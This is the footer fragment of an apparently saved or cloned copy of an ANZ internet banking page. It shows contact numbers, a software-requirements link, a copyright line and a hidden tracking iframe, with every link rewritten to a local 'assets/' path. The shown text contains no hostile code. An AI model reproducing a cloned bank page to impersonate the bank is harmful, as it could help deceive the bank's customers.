		<div class="sc-gxMtzJ kyksVE"><span class="sc-gGBfsJ SFRBD"></span></div></div></div><hr aria-hidden="true" class="sc-lhVmIH sc-bYSBpT ifaqNB"><div class="sc-bwzfXH sc-ifAKCX fBZoRA"><div class="sc-htpNat sc-EHOje cmUniE"><span data-test-id="need-help-section" class="sc-ktHwxA iSJzif"><span class="sc-feJyhm cKzeMS">Need help?</span><p class="sc-gzOgki ijCyQu">Call us on <a data-test-id="customer-australia-phone" href="assets/tel:13 33 50" rel="noopener" class="sc-kEYyzF sc-iAyFgw ihIOpA">13 33 50</a> any time (<a data-test-id="customer-overseas-phone" href="assets/tel:+61 3 8699 6908" rel="noopener" class="sc-kEYyzF sc-iAyFgw ihIOpA">+61 3 8699 6908</a> from overseas).</p><p class="sc-gzOgki kmExjg"><a data-test-id="software-requirement-link" href="assets/http://www.anz.com/personal/ways-bank/internet-banking/software-requirements-settings/" rel="noopener" target="_blank" class="sc-kEYyzF sc-kkGfuU gXtpGQ">Software requirements and settings</a></p></span></div></div></div></form></div></div></div></div></main><footer class="sc-jlyJG glAzNR"><div class="sc-gipzik eEcyDE"><div class="sc-htoDjs sc-iwsKbI sc-jzJRlG iuAjqe"><span class="sc-Rmtcm aoUts"><div data-test-id="footer-details" class="sc-ckVGcZ cBjIsl">© Australia and New Zealand Banking Group Limited (ANZ) 2022<span class="sc-csuQGl kccUTI"> ABN 11 005 357 522.</span></div></span></div></div></footer></div></div><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_anz_0" name="destination_publishing_iframe_anz_0_name" src="assets/index_1.html#https%3A%2F%2Fregister.anz.com" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe>
</body></html>